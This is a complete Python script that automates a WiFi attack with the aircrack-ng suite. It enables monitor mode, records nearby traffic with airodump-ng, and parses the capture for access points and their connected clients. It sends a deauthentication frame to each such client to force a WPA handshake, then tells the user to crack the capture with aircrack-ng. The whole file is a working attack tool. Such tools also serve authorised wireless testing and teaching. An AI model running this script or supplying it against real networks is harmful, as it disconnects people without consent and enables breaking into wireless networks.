#!/usr/bin/env python

import subprocess
import time

# Checks if user is root
def check_user():
	try:
		user = subprocess.check_output(["whoami"])
		user = str(user.strip())
		if user == "b'root'":
			print("You are root. Excellent.")
			return True
		else:
			print("Please run as root!")
			print("Exiting..")
			return False
	except OSError:
		print("Could not verify user. Is this a Linux system?")
		exit(1)

# Starts monitor interface
def start_mon():
	

	try:
		print("We will now try to enable the monitor mode. If already enabled, leave empty.")
		wifi_iface = str(input("Wireless interface: ")) 
		channel = str(input("Channel: "))

		if len(wifi_iface) == 0:
			pass
		else:
			# Enable monitor mode, exit if returncode is other than 0
			try:
					subprocess.check_call(["airmon-ng", "start", wifi_iface, channel])
			except subprocess.CalledProcessError as e:
				print("ERROR! Could not enable monitor mode: \n" + str(e))
				print("Exiting..")
				exit(1)

		try:
			print("Now, please specify the monitor interface!")
			print("Available monitor devices according to iw:")
			subprocess.call(['iw', 'dev'])
			mon_iface = str(input("Monitor interface: "))
			return mon_iface, channel

		except subprocess.CalledProcessError as e:
			print("ERROR! Could not get list of interfaces: \n" + str(e))
			print("Exiting..")
			exit(1)
	except:
		print("Something bad happened..")

# Starts airodump
def start_airodump(iface_ch):
	mon_iface = iface_ch[0]
	channel = iface_ch[1]
	print("We are about to start airodump, saving data into a file.")
	while True:
		fname = input("Filename: ")
		fname = fname.strip()
		if fname:
			break
	while True:
		try:
			duration = int(input("For how long would you like to save data? (in seconds): "))
			if not duration:
				print("Try again.")
			break
		except:
			print("Try again.")
	try:
		print("Collecting data..")
		aa = subprocess.check_output(["airodump-ng", "-c", channel, "-w", fname, mon_iface], timeout=duration).pid
	except:
		print("Done!")
		return fname

def start_aireplay(ap_mac, station_mac, iface_ch):
	mon_iface = iface_ch[0]
	#channel = iface_ch[1]
	try:
		print("Injecting frame into" + str(ap_mac))
		derp = subprocess.check_output(["aireplay-ng", "-0", "1", "-a", ap_mac, "-c", station_mac, "--ignore-negative-one", mon_iface])
	except:
		print("Not sure if everything went okay.. exiting")
		exit(1)
	return True

###### MAIN ######
if not check_user(): # Call function to check if user is root
	exit(1)

# Remind user of killing network-related processes
while True:
	try:
		ans=str(input("Please kill all network-related processes (e.g. wpa_supplicant). Done? (y/n): "))
	except:
		print("Something went wrong!")
	if ans == "n":
		print("Exiting..")
		exit(1)
	elif ans == "y":
		break

iface_ch = start_mon() # Start monitor interface

if len(iface_ch) == 2:
	fname = start_airodump(iface_ch)


f = open(fname + '-01.csv', 'r')
f_data = f.readlines()
f.close()

f_data = f_data[2:]
del f_data[-1]

ap_macs = []
station_macs = {}

i = 0
for line in f_data:
	f_data_temp = line.split(',')
	if f_data_temp[0].strip() == '':
		del f_data[:i]
	else:
		ap_macs.append(f_data_temp[0])
		i=i+1

f_data = f_data[2:]
for line in f_data:
	f_data_temp = line.split(',')
	station_macs[f_data_temp[0]] = f_data_temp[5].strip()

for mac in station_macs:
	if station_macs[mac] in ap_macs:
		start_aireplay(station_macs[mac], mac, iface_ch)

print("Now run aircrack-ng on the .cap file")
